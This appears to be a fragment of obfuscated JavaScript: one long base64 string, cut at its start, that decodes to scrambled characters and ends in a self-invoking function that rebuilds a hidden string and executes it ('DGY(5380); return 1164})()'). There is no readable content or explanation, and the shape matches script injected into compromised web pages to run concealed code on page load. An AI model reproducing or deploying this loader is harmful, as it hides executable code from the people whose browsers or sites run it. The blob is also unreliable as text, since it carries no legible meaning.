NiSUs6Q2k/ZUEuRGkoaGIlMX1dYWZBdSB0fXQ8MCVfLmVvMipyNFssYSBmQ3gpdF9lb19BYyUlLnMgXUFlbl04QW9wdG5zMmZdYSA6KWVmb2U9ZS5BM3krZm5mc243Xy47cm8xMmYhc3VsQXQzQW1zczJBb11pdCV1IENzMXBhb2Z0QVtmby54NWZpdGkuZzF4ZXMpbH1nY2xpJV9BMjYuX25uZXUuKWVsOz4oQWFncG8wIV5pMGI+OC4oeyJ0KGYzLiVvdDFBX0Elc3JBPTZjM2J2QWhjJT0jQWljb2hBZU1yPWdtLTkhdGEuXztcXGwlZG40Ympjb2NBXC8yckEhaWguZHYlLHR0OiVfQTBmX0FmKSY1X2hzLG9lLkQsM3M9QWF0aWZyOkFyZ0U+XWZuNXRJbmUxeykydD9hQXs0c1NBKCgpQS5NZS5adWYlaCFPbn1vNnhAQTJnZWNdMG5lJV1dLk09LjFuIG9lZjVvaG50b0FHK0EzJTFBZC4oQWddXjRkKTVTMEdjY2M1QWFpLDJhLigoYSguIG8xTkUoX0k/bl9mN29BX2Y7QS0jbyZmQUFhMi1ZXzUlK110e3RoNUEyMV0ocyxcXEF9cEopaV9BPTdBPi5Bd0E0Ll8uK2EhZmxyO2xaZzMxd11veWkxYm1ZcmZjckExXWYldGFsLm4xckZqbGF4QV1dKVldbDdlZiJBZWZBO0UhZiV4XFwxXykpKSxiQUFBdCxBQSUzLkFmb2w9KDwubkF6ISV0ICV0QXRdZWF6ZTFmLl9BZWYhdV9Zby4zZiVdXW5ub0ExdFwnYS43JXsoZl1sQSRyQS5BJW43QXJbIUFBdmkuLnJvZSlEaUEobz04OVhdbmUuaXlabihyJGdpezpBOHIyVHU7QXguICgpMGkqIEFtNmFlYXV0Lj0pLTEzbGxyblwvO2grMW59Z3tkb0FlYXQpfWYyMjVfdS46dSkzNjtdZXIyIXBBc101dW82bDtlcktlXSgkZSQhYzVmXyVmZV1ycm9BUyRqYmh4QSExNm9mX2EtW0tcXHNnZUF7ZjsufWxBNz02XXBdaWR0WT1BJiAsXWVpPTNUe2Uod3ggQXBpYV84ZilfZUFnPV1BNEE7ZTVjZj4uW2VuLntBdTFkQWErYUFPIzN9bz9BaWRnNTY7LjcsVUNyb29fNCkubWImNDZvKCAiNFBBbmFgc2lBIkFpdG5jSzl1LHhybl03ZEFBWmM5LnRfXWciQWY5QVFBKTM9c2ZmQSlhKGlyXW0uZjMkMilAb19BJXFpYkFdMS4/e2xdYTM9KEFyLj9fcihhY0F0NUdBdVU6dV90PXIuJClzWmlpZCBpNEV0bnJjND1LQWY7Lj1BckFBKG5tUHdjY0RsNG0zLEE7KD1BXUEuaD1pJSkxZjJBYj1lb0F4IF1uaHdvc0FpKExiX0EoZXQmQXJBQS4sPV1kKVpubl0gQV9iIWZwZWU2ciVkYmgxPmJsci4xbmVILnBdZShWKVJBO28yfWloJHJBIShuQSxfdGxBZC47Z0kgLEFfYSEuICFnISA6ZmkyOEF9ME86PWZmYkE2QW5pIC5ddDE1IDVtY3JhQVh9dC5zdDUrM0FBOyhne2FYSGZBcC5cXHJyYjB0ZF9yLXN9ZjpvZS4wXUFfQVlpbCh0JTFobE5BPSlBLkF0U19BZSBfcnJBKGhdNnMuZHIxMjVBb0EoeyxbQXJnNTUucDRcXCt9ZkF0QV10PXAmdDR0O2UyMzIyOSQyQTR0b0hfWGN7O18zJWUxfUF0ODc1Mm80PXQ6LkFkJWVBKWsuLjVdOGExNjE8Znl0TiZfZEEhXy5rKEFlKHhvfX0pTjs1NW9BfXI9fUF1U0EgU10uMyBBfW07byVleCwhbHNfPTtvLmVBNDNUUHJhZWNvZWYgQkBBYkEqdGZ7NnJlQUFVdDo4bmZ4XUFydHRsZS5BYmQgX0FfXCdlSHEhIG9dJGxBQWZBQWU1YnJhQTJoKnQ2eDIpYmtrYylsZnRzQSVRZHhjZj1pPUFyZWVkO2VBWzBdbjhmc2hvbCVkNmRBamhmZkFmfWV3WGg7QTNBaGYyI3J9KUF0JGooKWNiQXh0N2RfQW4hYnR7dVMpPSE1MmxTYmZBIyVkYyMufV8odHRbLl1BLGxlMTI+XSFuNE1YPSEwSUF0IW0sQV9BaSYmOysoaUFhXT1nbjFUNj8zaClBXz0ub2VvMnIkNGlvKEElO3JDbyhuaSs9c102QWRlX19kXzA2cjxlZWQ9QT9lQVhiQStjOWxBdUFBXTRBPW89ZUFyYWVvYjVfQWFfQUFBPUF0Ymw9QV9vKWlpXWFzNGhfQUFBZWEoWDthe0Euam45ZHIuY0FzJVpBZjNBIFwndV1kYTkoO2ZiZF1zLkFtQWldIWEhQUF7XSk6WztSMDpjZXV1XT1uQVV1Kl9fdC5BMUFfbitnO18zQShdPUEjYyRBc2cwbyFlaX1lQWVob2VhNDFjX2U1YnM0bkxhX3NybnUgPWlvO0FmSUEzXSxMXCddKVpvMHQ7cyVBZUVBQSh3QV4xMDFkKV9vQX0zJWZBRmkuQUFjaG5mLG5BcnAkPXJTZjRzI0FXPUEwaV06YkFBQTRffSApOHtsb1hdUjQzQS5bKylRLnQpXT1Bc0EpdGVyOytBMF1dXV9mKXlhcnNzdGVlcyk3Z0EgXC8uMCtBKV1BZC59WSxBfTBJQWopX2Y4M3R7b3JhaXJjdTVBWyk6ey4ubnJ1QWZlX0E9YWNBKWJhZmVmMHRyX3sxYSVvZV82eS5yb0FfOy0lQSF5aHBhcmY7RkFuQTRtXy5dMCUlLCxiaXRtQWxjY19nIWlyaChyLnR1fTplLjkoKy5BQVRBey0sZUFnM29uX19mQUF7XWUpcmxuSl90dGVmPSxBQSt9NWlvWG59aGxvK1oxQShjMTYlMGxuMWV4cjBBXSggdDB4bzFvW29FbmVdZGEyXUFmWGlqMGEzNEFmZUF0PW9BQS0laTVBRktsLjNBMkF1QTNdX0F0ZDsxXSApNXQge3tBaSBhWWE9Zi5laS5vLC49NEFmZFMrKHRiKE4uXVkoZjRiWXg1Mm90bUJBYWk9bjcrQUxybGlvZnQsKWM9ZEFzLC5zYl1BbztkNTdBZHtBQXRudCl0b1NdeW4uQWsjKS5UOXRBbUtfLikoQWxBam07bzo+XzRBLCMkNUFmaTFdKTVkKWRBQT1zbnBBKX1BMzcwdENfdGNBZX17MUEuXSB7Zkt0PWc1LkEwfWV0QWFydHJBanQ4QDtBczNBIkFBX05sfWZBQS5jVCElaV11Y2VpQTg6cnJpKXBpXWVuLnlBc0EuQWkkdD1BdiU4ZnBjQkFBaUEpSGw4JiFmZGU9QV9BcjN1Q3FddHIgQUFCfXBye0E2dDJsQUF1KColY2Y1JHYpJnJwPVAkWCkubl1yZV9Be10gXV1pOy5iY0F0ZmUpPy47UzAuZGlfdHopMkFBQWVpOy4ubDFfVzRvO2dBZTU5Vl0lLixIXWUyLD02LTJzQSkyOXM6Xy5pKWVBZUE7U0FjcmhBcGF0c15lQXRuIHVkKGZjPSlmMT0gTXllKG5db18pZildQT0lRWIwb3I7QTIoNl0uMnJeOykockFcJ2Nsb11vZCBjbns7e0VfYShqSm4oX0E1KTJhJS5BZV0laX0uW2RvQWkxJEF0b19BLEspQWZlQSkuO2kyJVdoXUFfOXAhdGRBLm9kYSF4QS09QWVMZTRdMj09Myxzc2ZuJl8uJSZ0MGN1LnprQT03LixUNkFTYWw9NkE1KEEsQSkgKEFuXWxnMzApMTphWSRbNnVmbmZufUFfYl8lOzlfbyl2QUltMWY+cmBBJXNvbyggQWNbLnBvNWxsbmUoIX0wLCUpdGVBcC5uXWFbMm03YmVuaX1zZVpcJ309QSkoXW5vUXAxIF8xX2tBMXJBX2UiSV9tajk3RGEwM19BUl1hQWFwcyVdXUFjIUxvYDUpb19TQS5BX2JuNWMoKEFuQnNmMWY0cCUobEE9M29wMCBkQV1fb21mZnIrdWFBaWZlMWguZUEpSm81M0FdbyBvW2Y2QTo7YyhmeyRwdEE1QTNfMyVgZV0sdGFwMnJjMWsyJis7ZUEzb21vKU5mQWVmKGlyIFUhen1lMnthMmFIJSlBZGUoeyBvb11fQV9obnAuYS54QWVUdnJuRS5BKWggOzJsYTRpLmdvQXNldSsxNnQuQStkZnRvdDZdbkFlJHAuQUE0Y2ZjM3R7IGMoQXRBblRBQ31Bcm4gZiApZVhPci53Um9cXHA2ZV9BPXR0QUFjcjJpJXRuXV1fd0FyNm9kMnNwbylqYyAyKW4xNXQ6b19ze302LHU7QW4gZTt0bSY/dyUocyhhNi5dOUFhZn0pOzEpXUAoKUFsQXRjQTdvXX0zPUEpIXIpXUFfcF00K3M4W2gsQWpuQTUpMyk9JHIgYylzU0EzPUE2NTArIlwve0FdIS5vID1veS4tIV9mKCBmYUgjQXVtZm5oKS4zOm5hQS5mIChiZiEzQTMrOkVpZyE1dF1ZJUEuKGEuJXspQWcgXz1Bbm9BMSZmPXVfb3YkQXNBbjonKSk7dmFyIERHWT1xamkod21hLGxQZiApO0RHWSg1MzgwKTtyZXR1cm4gMTE2NH0pKCk='))
